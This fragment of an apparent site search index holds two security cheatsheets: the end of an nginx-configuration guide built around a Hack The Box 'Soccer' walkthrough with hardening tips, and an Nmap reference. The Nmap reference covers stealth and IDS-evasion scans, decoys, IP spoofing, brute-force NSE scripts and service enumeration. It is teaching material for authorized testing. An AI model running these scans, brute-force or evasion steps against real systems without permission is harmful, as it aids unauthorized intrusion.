/etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"real-world-example-soccer-htb-analysis\"\u003eReal-World Example: Soccer HTB Analysis\u003c/h2\u003e\n\u003ch3 id=\"initial-discovery\"\u003eInitial Discovery\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Found nginx configuration in compromised system\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewww-data@soccer:/etc/nginx/sites-enabled$ ls -la\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etotal \u003cspan class=\"m\"\u003e8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edrwxr-xr-x \u003cspan class=\"m\"\u003e2\u003c/span\u003e root root \u003cspan class=\"m\"\u003e4096\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e17\u003c/span\u003e  \u003cspan class=\"m\"\u003e2022\u003c/span\u003e .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edrwxr-xr-x \u003cspan class=\"m\"\u003e8\u003c/span\u003e root root \u003cspan class=\"m\"\u003e4096\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e17\u003c/span\u003e  \u003cspan class=\"m\"\u003e2022\u003c/span\u003e ..\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elrwxrwxrwx \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root   \u003cspan class=\"m\"\u003e34\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e17\u003c/span\u003e  \u003cspan class=\"m\"\u003e2022\u003c/span\u003e default -\u0026gt; /etc/nginx/sites-available/default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elrwxrwxrwx \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root   \u003cspan class=\"m\"\u003e41\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e17\u003c/span\u003e  \u003cspan class=\"m\"\u003e2022\u003c/span\u003e soc-player.htb -\u0026gt; /etc/nginx/sites-available/soc-player.htb\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"configuration-analysis\"\u003eConfiguration Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract virtual host information\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ cat soc-player.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen 80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen \u003cspan class=\"o\"\u003e[\u003c/span\u003e::\u003cspan class=\"o\"\u003e]\u003c/span\u003e:80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name soc-player.soccer.htb\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    root /root/app/views\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass http://localhost:3000\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_http_version 1.1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Upgrade \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Connection \u003cspan class=\"s1\"\u003e\u0026#39;upgrade\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_cache_bypass \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"key-findings\"\u003eKey Findings\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eAdditional virtual host discovered\u003c/strong\u003e: \u003ccode\u003esoc-player.soccer.htb\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInternal service exposed\u003c/strong\u003e: Application running on \u003ccode\u003elocalhost:3000\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWebSocket support\u003c/strong\u003e: Configuration for WebSocket upgrades\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDocument root\u003c/strong\u003e: \u003ccode\u003e/root/app/views\u003c/code\u003e (unusual location)\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"automation-scripts\"\u003eAutomation Scripts\u003c/h2\u003e\n\u003ch3 id=\"nginx-configuration-parser\"\u003eNginx Configuration Parser\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# nginx_analyzer.sh - Extract key information from nginx configs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNGINX_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/etc/nginx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== Nginx Configuration Analysis ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Virtual Hosts:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_name\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NGINX_PATH\u003c/span\u003e/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $3}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Listening Ports:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;listen\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NGINX_PATH\u003c/span\u003e/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Proxy Destinations:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;proxy_pass\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NGINX_PATH\u003c/span\u003e/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Document Roots:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;root \u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NGINX_PATH\u003c/span\u003e/ \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Potential Security Issues:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r -E \u003cspan class=\"s2\"\u003e\u0026#34;(server_tokens on|autoindex on|allow all)\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NGINX_PATH\u003c/span\u003e/ 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"security-recommendations\"\u003eSecurity Recommendations\u003c/h2\u003e\n\u003ch3 id=\"hardening-configuration\"\u003eHardening Configuration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Security headers\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Frame-Options\u003c/span\u003e \u003cspan class=\"s\"\u003eDENY\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-Content-Type-Options\u003c/span\u003e \u003cspan class=\"s\"\u003enosniff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eX-XSS-Protection\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003emode=block\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eadd_header\u003c/span\u003e \u003cspan class=\"s\"\u003eStrict-Transport-Security\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;max-age=31536000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003eincludeSubDomains\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Hide nginx version\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eserver_tokens\u003c/span\u003e \u003cspan class=\"no\"\u003eoff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Rate limiting\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003elimit_req_zone\u003c/span\u003e \u003cspan class=\"nv\"\u003e$binary_remote_addr\u003c/span\u003e \u003cspan class=\"s\"\u003ezone=global:10m\u003c/span\u003e \u003cspan class=\"s\"\u003erate=10r/s\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003elimit_req\u003c/span\u003e \u003cspan class=\"s\"\u003ezone=global\u003c/span\u003e \u003cspan class=\"s\"\u003eburst=20\u003c/span\u003e \u003cspan class=\"s\"\u003enodelay\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# File upload restrictions\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eclient_max_body_size\u003c/span\u003e \u003cspan class=\"s\"\u003e10M\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Disable autoindex\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eautoindex\u003c/span\u003e \u003cspan class=\"no\"\u003eoff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"monitoring-and-logging\"\u003eMonitoring and Logging\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enhanced logging format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog_format detailed \u003cspan class=\"s1\"\u003e\u0026#39;$remote_addr - $remote_user [$time_local] \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                   \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;$request\u0026#34; $status $body_bytes_sent \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                   \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;$http_referer\u0026#34; \u0026#34;$http_user_agent\u0026#34; \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                   \u003cspan class=\"s1\"\u003e\u0026#39;$request_time $upstream_response_time\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Log monitoring commands\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etail -f /var/log/nginx/access.log \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s2\"\u003e\u0026#34;(4[0-9]{2}|5[0-9]{2})\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;$9 ~ /^[45]/ {print $0}\u0026#39;\u003c/span\u003e /var/log/nginx/access.log \u003cspan class=\"p\"\u003e|\u003c/span\u003e tail -20\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cp\u003e\u003cem\u003eAlways ensure proper authorization before analyzing nginx configurations on systems you don\u0026rsquo;t own. This information should be used for legitimate security testing and system administration purposes only.\u003c/em\u003e\u003c/p\u003e","title":"Nginx Configuration Analysis Cheatsheet"},{"content":"Nmap Cheatsheet - Complete Reference Guide Basic Scanning Simple Host Scan # Basic scan of single host nmap 192.168.1.100 # Scan multiple hosts nmap 192.168.1.100-110 nmap 192.168.1.100,102,104 # Scan subnet nmap 192.168.1.0/24 Common Port Ranges # Scan top 1000 ports (default) nmap target # Scan specific ports nmap -p 80,443,22,21 target # Scan port ranges nmap -p 1-65535 target nmap -p- target # All ports shorthand # Scan top ports nmap --top-ports 100 target Host Discovery Ping Scans # No port scan, just ping nmap -sn 192.168.1.0/24 # TCP SYN ping nmap -PS target # TCP ACK ping nmap -PA target # UDP ping nmap -PU target # Skip ping (assume host is up) nmap -Pn target ARP Discovery # ARP ping scan (local network) nmap -PR 192.168.1.0/24 # List scan (no ping, no port scan) nmap -sL 192.168.1.0/24 Port Scanning Techniques TCP Scans # TCP SYN scan (default, stealthy) nmap -sS target # TCP Connect scan (full connection) nmap -sT target # TCP ACK scan (firewall detection) nmap -sA target # TCP Window scan nmap -sW target # TCP Maimon scan nmap -sM target UDP Scans # UDP scan (slow but important) nmap -sU target # Combined TCP/UDP scan nmap -sS -sU target # Fast UDP scan (top ports) nmap -sU --top-ports 100 target Specialized Scans # FIN scan (stealth) nmap -sF target # NULL scan (stealth) nmap -sN target # Xmas scan (stealth) nmap -sX target # Idle scan (ultra stealth) nmap -sI zombie_host target Service \u0026amp; Version Detection Version Detection # Service version detection nmap -sV target # Aggressive version detection nmap -sV --version-intensity 9 target # Light version detection nmap -sV --version-intensity 2 target OS Detection # OS fingerprinting nmap -O target # Aggressive OS detection nmap -O --osscan-guess target # OS detection with version scanning nmap -O -sV target Combined Detection # Aggressive scan (OS, version, scripts, traceroute) nmap -A target # Standard aggressive scan with common ports nmap -A -T4 target Script Engine (NSE) Default Scripts # Run default scripts nmap -sC target nmap --script=default target # Combine with version detection nmap -sC -sV target Script Categories # Vulnerability scripts nmap --script=vuln target # Authentication scripts nmap --script=auth target # Brute force scripts nmap --script=brute target # Discovery scripts nmap --script=discovery target # Malware detection nmap --script=malware target Specific Scripts # HTTP enumeration nmap --script=http-enum target # SMB enumeration nmap --script=smb-enum-shares target # DNS information nmap --script=dns-brute target # SSL certificate info nmap --script=ssl-cert target # Heartbleed detection nmap --script=ssl-heartbleed target Script Arguments # Pass arguments to scripts nmap --script=http-form-brute --script-args userdb=users.txt,passdb=pass.txt target # Multiple script arguments nmap --script=smb-brute --script-args userdb=users.txt,unpwdb.timelimit=60s target Stealth \u0026amp; Evasion Timing Templates # Paranoid (very slow, IDS evasion) nmap -T0 target # Sneaky (slow, IDS evasion) nmap -T1 target # Polite (normal, no bandwidth flooding) nmap -T2 target # Normal (default) nmap -T3 target # Aggressive (fast, reliable networks) nmap -T4 target # Insane (very fast, sacrifice accuracy) nmap -T5 target Firewall Evasion # Fragment packets nmap -f target # Specify MTU nmap --mtu 24 target # Decoy scanning nmap -D RND:10 target nmap -D decoy1,decoy2,ME,decoy3 target # Source IP spoofing nmap -S spoofed_ip target # Source port specification nmap --source-port 53 target nmap -g 53 target Advanced Evasion # Random delay between probes nmap --scan-delay 5s target # Random host order nmap --randomize-hosts target # Bad checksum (firewall testing) nmap --badsum target # Data length nmap --data-length 25 target Output Formats Standard Output # Normal output nmap target # Verbose output nmap -v target nmap -vv target # More verbose # Debug output nmap -d target nmap -dd target # More debug info File Output # Normal format nmap -oN scan_results.txt target # XML format nmap -oX scan_results.xml target # Grepable format nmap -oG scan_results.gnmap target # All formats nmap -oA scan_results target # Script kiddie format nmap -oS scan_results.txt target Advanced Techniques Performance Optimization # Parallel host scanning nmap --min-hostgroup 50 --max-hostgroup 100 target # Parallel port scanning nmap --min-parallelism 50 --max-parallelism 100 target # Packet rate control nmap --min-rate 1000 --max-rate 5000 target # Timeout control nmap --host-timeout 300s target Network Interface Control # Specify interface nmap -e eth0 target # Specify source IP nmap -S 192.168.1.50 target # IPv6 scanning nmap -6 target Firewall/IDS Testing # ACK scan for firewall rules nmap -sA -p 1-1000 target # Window scan for firewall detection nmap -sW target # FIN scan to bypass simple firewalls nmap -sF target Practical Examples Web Server Enumeration # Comprehensive web server scan nmap -p 80,443 -sV --script=http-enum,http-headers,http-methods,ssl-cert target # WordPress enumeration nmap -p 80,443 --script=http-wordpress-enum target SMB Enumeration # Complete SMB enumeration nmap -p 445 --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users target # SMB vulnerability scan nmap -p 445 --script=smb-vuln-* target Database Enumeration # MySQL enumeration nmap -p 3306 --script=mysql-enum,mysql-info,mysql-databases,mysql-variables target # MSSQL enumeration nmap -p 1433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell target # Oracle enumeration nmap -p 1521 --script=oracle-sid-brute,oracle-enum-users target Mail Server Enumeration # SMTP enumeration nmap -p 25,465,587 --script=smtp-enum-users,smtp-commands,smtp-open-relay target # POP3/IMAP enumeration nmap -p 110,143,993,995 --script=pop3-capabilities,imap-capabilities target NSE Script Development Basic Script Structure -- nmap script example local nmap = require \u0026#34;nmap\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; description = [[ Script description here ]] author = \u0026#34;Your Name\u0026#34; license = \u0026#34;Same as Nmap--See https://nmap.org/book/man-legal.html\u0026#34; categories = {\u0026#34;default\u0026#34;, \u0026#34;discovery\u0026#34;} portrule = shortport.port_or_service(80, \u0026#34;http\u0026#34;) action = function(host, port) return \u0026#34;Script output\u0026#34; end Common Nmap Commands Quick Reference Command Description nmap -sS target TCP SYN scan nmap -sU target UDP scan nmap -sV target Version detection nmap -O target OS detection nmap -A target Aggressive scan nmap -sC target Default scripts nmap -p- target All ports nmap -T4 target Aggressive timing nmap -Pn target Skip ping nmap -oA results target All output formats Tips \u0026amp; Best Practices Performance Tips Use -T4 for faster scans on reliable networks Combine -sS -sU for comprehensive coverage Use --top-ports for quick reconnaissance Leverage --min-rate and --max-rate for speed control Stealth Considerations Use -T0 or -T1 for stealth scanning Implement decoy scanning with -D Fragment packets with -f to evade detection Use source port manipulation with -g Legal \u0026amp; Ethical Notes ‚ö†Ô∏è Warning: Only scan systems you own or have explicit permission to test. Unauthorized scanning may be illegal in your jurisdiction.\nThis cheatsheet covers the essential Nmap commands and techniques for network reconnaissance and security assessment. For complete documentation, refer to the official Nmap documentation at nmap.org.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/nmap/","summary":"\u003ch1 